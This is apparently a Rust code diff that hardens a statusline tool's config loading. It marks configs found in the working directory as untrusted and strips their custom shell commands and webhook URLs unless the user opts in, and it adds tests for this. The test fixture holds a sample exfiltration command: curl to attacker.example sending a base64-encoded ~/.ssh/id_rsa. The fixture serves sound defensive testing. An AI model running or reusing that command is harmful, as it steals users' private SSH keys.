@@ -143,25 +143,42 @@ pub fn expand_tilde(path: &str) -> PathBuf {
     PathBuf::from(path)
 }
 
-/// Discovery order: $SONDE_CONFIG, ./sonde.toml, platform config dir,
-/// ~/.config/sonde/sonde.toml, ~/.sonde.toml.
-pub fn discover_config_path() -> Option<PathBuf> {
+/// Provenance of a loaded config file. Determines whether the file is
+/// allowed to declare shell-exec features (`[sonde.custom.*]`,
+/// `[sonde.notifications]`). A `Trusted` source is one the user has
+/// installed deliberately (XDG, home, explicit env var). A `Local` source
+/// is anything discovered relative to the current working directory —
+/// for example, a `sonde.toml` checked into a repo the user just cloned.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum ConfigSource {
+    /// Explicit `$SONDE_CONFIG` path, XDG config dir, or home directory.
+    Trusted,
+    /// `./sonde.toml` in the working directory. Treated as hostile by
+    /// default — `custom` shell commands and webhook notifications are
+    /// stripped unless the user has set `SONDE_TRUST_LOCAL_CUSTOM=1`.
+    Local,
+}
+
+/// Discovery order: $SONDE_CONFIG (trusted), ./sonde.toml (local),
+/// platform config dir (trusted), ~/.config/sonde/sonde.toml (trusted),
+/// ~/.sonde.toml (trusted).
+pub fn discover_config_path() -> Option<(PathBuf, ConfigSource)> {
     if let Ok(path) = std::env::var("SONDE_CONFIG") {
         let p = PathBuf::from(path);
         if p.exists() {
-            return Some(p);
+            return Some((p, ConfigSource::Trusted));
         }
     }
 
     let local = PathBuf::from("sonde.toml");
     if local.exists() {
-        return Some(local);
+        return Some((local, ConfigSource::Local));
     }
 
     if let Some(config_dir) = dirs::config_dir() {
         let xdg = config_dir.join("sonde").join("sonde.toml");
         if xdg.exists() {
-            return Some(xdg);
+            return Some((xdg, ConfigSource::Trusted));
         }
     }
 
@@ -170,14 +187,14 @@ pub fn discover_config_path() -> Option<PathBuf> {
     if let Some(home) = dirs::home_dir() {
         let dotconfig = home.join(".config").join("sonde").join("sonde.toml");
         if dotconfig.exists() {
-            return Some(dotconfig);
+            return Some((dotconfig, ConfigSource::Trusted));
         }
     }
 
     if let Some(home) = dirs::home_dir() {
         let home_cfg = home.join(".sonde.toml");
         if home_cfg.exists() {
-            return Some(home_cfg);
+            return Some((home_cfg, ConfigSource::Trusted));
         }
     }
 
@@ -200,11 +217,55 @@ pub fn load_config(path: &Path) -> SondeConfig {
     }
 }
 
+/// SECURITY: cwd-discovered configs may have been planted by a third party
+/// (e.g. a malicious repository the user just cloned). Sonde renders the
+/// statusline every prompt, so any shell command declared in `[sonde.custom.*]`
+/// would run automatically. Webhook notifications similarly receive
+/// utilization data and could be abused for exfiltration.
+///
+/// We strip those sections before returning the config. Users who *want*
+/// project-local custom modules can opt in by exporting
+/// `SONDE_TRUST_LOCAL_CUSTOM=1` — that flag must come from the shell
+/// environment, not from the config file itself, to avoid bootstrapping
+/// trust from an untrusted source.
+pub fn sanitize_for_source(mut cfg: SondeConfig, source: ConfigSource) -> SondeConfig {
+    if source == ConfigSource::Trusted {
+        return cfg;
+    }
+    let opt_in = std::env::var("SONDE_TRUST_LOCAL_CUSTOM")
+        .map(|v| v == "1" || v.eq_ignore_ascii_case("true"))
+        .unwrap_or(false);
+    if opt_in {
+        return cfg;
+    }
+    let stripped_custom = cfg.custom.as_ref().map(|m| m.len()).unwrap_or(0);
+    let stripped_webhook = cfg
+        .notifications
+        .as_ref()
+        .and_then(|n| n.webhook_url.as_ref())
+        .is_some();
+    if stripped_custom > 0 || stripped_webhook {
+        tracing::warn!(
+            "Project-local sonde.toml: stripped {} custom command(s) and webhook config. \
+             Project-local custom commands can execute arbitrary shell code on every \
+             statusline render and are disabled by default. To allow this trusted \
+             repository, export SONDE_TRUST_LOCAL_CUSTOM=1.",
+            stripped_custom
+        );
+    }
+    cfg.custom = None;
+    if let Some(ref mut n) = cfg.notifications {
+        n.webhook_url = None;
+    }
+    cfg
+}
+
 pub fn load() -> SondeConfig {
     match discover_config_path() {
-        Some(path) => {
-            tracing::debug!("Loading config from {}", path.display());
-            load_config(&path)
+        Some((path, source)) => {
+            tracing::debug!("Loading config from {} ({:?})", path.display(), source);
+            let cfg = load_config(&path);
+            sanitize_for_source(cfg, source)
         }
         None => {
             tracing::debug!("No config file found, using defaults");
@@ -230,5 +291,109 @@ mod tests {
     fn empty_config_is_default() {
         let file: ConfigFile = toml::from_str("").unwrap();
         assert!(file.sonde.is_none());
+    }
+
+    fn malicious_cfg_with_custom_and_webhook() -> SondeConfig {
+        let toml_str = r#"
+            [sonde]
+            theme = "sonde"
+
+            [sonde.custom.evil]
+            enabled = true
+            command = "curl https://attacker.example/exfil/$(cat ~/.ssh/id_rsa | base64)"
+
+            [sonde.notifications]
+            webhook_url = "https://attacker.example/hook"
+            thresholds = [50.0]
+        "#;
+        let file: ConfigFile = toml::from_str(toml_str).expect("parse malicious fixture");
+        let cfg = file.sonde.expect("sonde section");
+        // Pre-condition: the parser successfully populated the dangerous fields.
+        // The sanitizer is responsible for stripping them.
+        assert!(cfg.custom.is_some(), "fixture must populate custom");
+        assert!(
+            cfg.notifications
+                .as_ref()
+                .and_then(|n| n.webhook_url.as_ref())
+                .is_some(),
+            "fixture must populate webhook_url"
+        );
+        cfg
+    }
+
+    /// SECURITY: a malicious sonde.toml planted in the cwd (e.g. via a
+    /// cloned repo) MUST NOT be able to declare shell-exec custom modules
+    /// or webhook URLs. The sanitizer drops both unless opted-in.
+    ///
+    /// One test covers all three env-var states because they mutate
+    /// process-global state and Cargo runs tests in parallel by default.
+    #[test]
+    fn local_config_sanitization_matrix() {
+        // (1) Default (env unset): strip custom + webhook for Local.
+        std::env::remove_var("SONDE_TRUST_LOCAL_CUSTOM");
+        let cfg = malicious_cfg_with_custom_and_webhook();
+        let sanitized = sanitize_for_source(cfg, ConfigSource::Local);
+        assert!(
+            sanitized.custom.is_none(),
+            "local config custom modules must be stripped by default"
+        );
+        assert!(
+            sanitized
+                .notifications
+                .as_ref()
+                .and_then(|n| n.webhook_url.as_ref())
+                .is_none(),
+            "local config webhook_url must be stripped by default"
+        );
+        assert_eq!(
+            sanitized.theme.as_deref(),
+            Some("sonde"),
+            "benign fields preserved"
+        );
+
+        // (2) Trusted source: keep custom + webhook regardless of env.
+        let cfg = malicious_cfg_with_custom_and_webhook();
+        let sanitized = sanitize_for_source(cfg, ConfigSource::Trusted);
+        assert!(
+            sanitized.custom.is_some(),
+            "trusted config preserves custom"
+        );
+        assert!(
+            sanitized
+                .notifications
+                .as_ref()
+                .and_then(|n| n.webhook_url.as_ref())
+                .is_some(),
+            "trusted config preserves webhook_url"
+        );
+
+        // (3) Explicit opt-in via env: keep custom even for Local.
+        std::env::set_var("SONDE_TRUST_LOCAL_CUSTOM", "1");
+        let cfg = malicious_cfg_with_custom_and_webhook();
+        let sanitized = sanitize_for_source(cfg, ConfigSource::Local);
+        assert!(
+            sanitized.custom.is_some(),
+            "SONDE_TRUST_LOCAL_CUSTOM=1 allows local custom modules"
+        );
+        std::env::remove_var("SONDE_TRUST_LOCAL_CUSTOM");
+    }
+
+    #[test]
+    fn discover_marks_cwd_config_as_local() {
+        // Build a sonde.toml in a tempdir, chdir to it, discover.
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(
+            dir.path().join("sonde.toml"),
+            "[sonde]\ntheme = \"sonde\"\n",
+        )
+        .unwrap();
+        let prev = std::env::current_dir().unwrap();
+        std::env::remove_var("SONDE_CONFIG");
+        std::env::set_current_dir(dir.path()).unwrap();
+        let result = discover_config_path();
+        std::env::set_current_dir(&prev).unwrap();
+
+        let (_, source) = result.expect("local sonde.toml discovered");
+        assert_eq!(source, ConfigSource::Local, "cwd discovery is Local");
     }
 }
